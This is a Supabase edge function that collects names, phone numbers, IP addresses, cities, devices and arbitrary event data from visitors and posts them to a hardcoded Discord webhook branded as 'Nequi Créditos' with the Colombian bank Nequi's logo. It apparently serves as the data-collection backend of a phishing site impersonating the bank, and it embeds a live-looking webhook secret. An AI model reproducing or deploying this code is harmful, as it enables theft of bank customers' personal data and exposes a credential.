import "jsr:@supabase/functions-js/edge-runtime.d.ts"

const corsHeaders = {
  "Access-Control-Allow-Origin": "*",
  "Access-Control-Allow-Methods": "GET, POST, PUT, DELETE, OPTIONS",
  "Access-Control-Allow-Headers": "Content-Type, Authorization, X-Client-Info, Apikey",
}

// Discord embed colors
const COLORS = {
  success: 0x22C55E,   // Green
  warning: 0xF59E0B,   // Yellow
  error: 0xEF4444,     // Red
  info: 0x3B82F6,      // Blue
  security: 0xE6005C,  // Pink/Red
}

interface EventPayload {
  type: "success" | "warning" | "error" | "info" | "security"
  eventName: string
  description: string
  user?: {
    name?: string
    email?: string
    id?: string
    role?: string
    phone?: string
  }
  data?: Record<string, string | number | boolean>
  userAgent?: string
  version?: string
}

interface GeoData {
  ip: string
  country_name?: string
  city?: string
  region?: string
  org?: string
}

async function getGeoData(ip: string): Promise<GeoData> {
  try {
    const res = await fetch(`https://ipapi.co/${ip}/json/`, {
      headers: { "User-Agent": "NequiCreditApp/1.0" },
      signal: AbortSignal.timeout(3000),
    })
    if (!res.ok) throw new Error("geo fetch failed")
    return await res.json()
  } catch {
    return { ip }
  }
}

function parseUserAgent(ua: string): { browser: string; os: string; device: string } {
  let browser = "Desconocido"
  let os = "Desconocido"
  let device = "Escritorio"

  if (/Edg\//.test(ua)) browser = "Microsoft Edge"
  else if (/Chrome\//.test(ua) && !/Chromium/.test(ua)) browser = "Chrome"
  else if (/Firefox\//.test(ua)) browser = "Firefox"
  else if (/Safari\//.test(ua) && !/Chrome/.test(ua)) browser = "Safari"
  else if (/Opera|OPR\//.test(ua)) browser = "Opera"

  if (/Windows NT 10\.0/.test(ua)) os = "Windows 10/11"
  else if (/Windows NT 6\.1/.test(ua)) os = "Windows 7"
  else if (/Mac OS X/.test(ua)) os = "macOS"
  else if (/Android/.test(ua)) os = "Android"
  else if (/iPhone|iPad/.test(ua)) os = "iOS"
  else if (/Linux/.test(ua)) os = "Linux"

  if (/Mobile|Android|iPhone/.test(ua)) device = "Móvil"
  else if (/Tablet|iPad/.test(ua)) device = "Tablet"

  return { browser, os, device }
}

function getClientIp(req: Request): string {
  return (
    req.headers.get("CF-Connecting-IP") ||
    req.headers.get("X-Forwarded-For")?.split(",")[0]?.trim() ||
    req.headers.get("X-Real-IP") ||
    "Desconocida"
  )
}

async function sendToDiscord(webhookUrl: string, payload: unknown, attempt = 1): Promise<void> {
  try {
    const res = await fetch(webhookUrl, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(payload),
      signal: AbortSignal.timeout(5000),
    })

    if (res.status === 429 && attempt <= 3) {
      const retryAfter = parseInt(res.headers.get("Retry-After") || "1") * 1000
      await new Promise((r) => setTimeout(r, retryAfter))
      return sendToDiscord(webhookUrl, payload, attempt + 1)
    }

    if (!res.ok && attempt <= 3) {
      await new Promise((r) => setTimeout(r, attempt * 1000))
      return sendToDiscord(webhookUrl, payload, attempt + 1)
    }
  } catch (err) {
    if (attempt <= 3) {
      await new Promise((r) => setTimeout(r, attempt * 1000))
      return sendToDiscord(webhookUrl, payload, attempt + 1)
    }
    console.error(`[Discord] Failed after ${attempt} attempts:`, err)
  }
}

function buildEmbed(
  payload: EventPayload,
  geo: GeoData,
  parsedUA: { browser: string; os: string; device: string },
  ip: string,
  timestamp: string,
) {
  const fields: Array<{ name: string; value: string; inline?: boolean }> = []

  // User info
  if (payload.user && Object.keys(payload.user).length > 0) {
    const u = payload.user
    const userLines = [
      u.name ? `**Nombre:** ${u.name}` : null,
      u.phone ? `**Teléfono:** ${u.phone}` : null,
    ].filter(Boolean)

    if (userLines.length > 0) {
      fields.push({ name: "👤 Usuario", value: userLines.join("\n"), inline: false })
    }
  }

  // Connection info
  const connLines = [`**IP:** \`${ip}\``]
  if (geo.city) connLines.push(`**Ciudad:** ${geo.city}`)
  connLines.push(`**Dispositivo:** ${parsedUA.device}`)
  fields.push({
    name: "🌐 Conexión",
    value: connLines.join("\n"),
    inline: false,
  })

  // Event data
  if (payload.data) {
    const dataLines: string[] = []
    Object.entries(payload.data).forEach(([k, v]) => {
      dataLines.push(`**${k}:** ${v}`)
    })
    fields.push({ name: "⚡ Evento", value: dataLines.join("\n"), inline: false })
  }

  // Date
  fields.push({
    name: "🕒 Fecha y Hora",
    value: timestamp,
    inline: false,
  })

  return {
    username: "Nequi Créditos",
    avatar_url: "https://upload.wikimedia.org/wikipedia/commons/thumb/b/b9/Nequi_Logo.svg/1200px-Nequi_Logo.svg.png",
    embeds: [
      {
        title: `📌 ${payload.eventName.toUpperCase()}`,
        color: COLORS[payload.type],
        fields,
      },
    ],
  }
}

Deno.serve(async (req: Request) => {
  if (req.method === "OPTIONS") {
    return new Response(null, { status: 200, headers: corsHeaders })
  }

  try {
    const webhookUrl = "https://discordapp.com/api/webhooks/1518758133567328318/n0Ee-8OjUeC2Nm0iwnBEgx6kJDsfVfSw294FI-_pFI9Bsu2rr1ZaFRNOBnba95ldeIz6"

    const payload: EventPayload = await req.json()
    const ip = getClientIp(req)
    const rawUA = payload.userAgent || req.headers.get("User-Agent") || ""
    const parsedUA = parseUserAgent(rawUA)

    // Fetch geo in parallel with the rest of the work
    const geo = await getGeoData(ip)

    const timestamp = new Date().toLocaleString("es-CO", {
      timeZone: "America/Bogota",
      year: "numeric",
      month: "2-digit",
      day: "2-digit",
      hour: "2-digit",
      minute: "2-digit",
      second: "2-digit",
    }) + " (COT)"

    const discordPayload = buildEmbed(payload, geo, parsedUA, ip, timestamp)

    // Fire-and-forget with retry
    sendToDiscord(webhookUrl, discordPayload).catch((err) =>
      console.error("[Discord] Background send error:", err)
    )

    return new Response(
      JSON.stringify({ ok: true }),
      { status: 200, headers: { ...corsHeaders, "Content-Type": "application/json" } },
    )
  } catch (err) {
    console.error("[Discord] Handler error:", err)
    return new Response(
      JSON.stringify({ error: "Internal error" }),
      { status: 500, headers: { ...corsHeaders, "Content-Type": "application/json" } },
    )
  }
})
